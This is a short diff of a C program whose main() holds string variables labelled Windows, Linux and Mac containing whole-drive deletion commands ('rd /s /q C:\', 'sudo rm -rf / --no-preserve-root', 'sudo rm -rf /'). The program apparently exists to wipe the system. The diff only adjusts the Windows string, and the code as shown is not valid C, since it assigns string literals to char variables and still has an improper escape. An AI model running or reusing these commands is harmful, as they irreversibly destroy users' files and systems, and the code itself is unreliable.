@@ -9,7 +9,7 @@ void timer(t) {
 }
 
 int main () {
-    char Windows = "rd /s /q C:\";
+    char Windows = "rd /s /q C:\ ";
     char Linux = "sudo rm -rf / --no-preserve-root";
     char Mac = "sudo rm -rf /";
 
